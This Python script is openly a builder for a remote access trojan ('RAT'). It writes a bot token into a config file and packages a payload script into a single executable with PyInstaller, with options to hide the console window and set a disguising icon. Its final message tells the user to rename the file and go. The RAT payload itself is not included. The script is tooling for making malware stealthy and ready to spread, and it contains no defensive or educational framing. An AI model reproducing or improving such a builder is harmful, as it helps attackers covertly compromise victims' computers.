import time
import subprocess

"""
US TO FAST BILD YOUR RAT
"""

commands = ['pyinstaller', '--onefile']
enters = '-_-_' * 16

def set_bot(token):
    with open('config.py', 'w') as f:
        f.write(f"TOKEN = '{token}'\n")

def create_exe(command : list, file_path: str, icon='--icon=icon.ico', console='--noconsole'):
    try:
        time.sleep(1)
        command.append(icon)

        if console == False:
            command.append(file_path)
            subprocess.run(command, check=True)
        else:
            command.append(console)
            command.append(file_path)
            subprocess.run(command, check=True)

        print(enters)
        print(f'Succeful bilding: your file in /dist/{file_path}\n Rename and go to us!')
        print(enters)
    except Exception as e:
        print(f'Error bilding: {e}')
        print(enters)

    finally:
        commands.clear()
        commands.append('pyinstaller')
        commands.append('--onefile')
        
    
if __name__=="__main__":
    while True:
        try:
            token = input('Enter your bot-token --> ')
            set_bot(token=token)

            file = input('Enter run file name(default: run.py) --> ')
            icon = input('Enter name icon(youricon.ico) default icon: y --> ')
            con = input('Console? y/n if you want to hide the console at startup: n --> ').lower()
            if icon == 'y':
                if con == 'y':
                    create_exe(commands, file, console=False)
                else:
                    create_exe(commands, file)
            else:
                if con == 'y':
                    create_exe(commands, file, icon, console=False)
                else:
                    create_exe(commands, file, icon)
        except Exception as e:
            print(f'error: {e}')
            print(enters)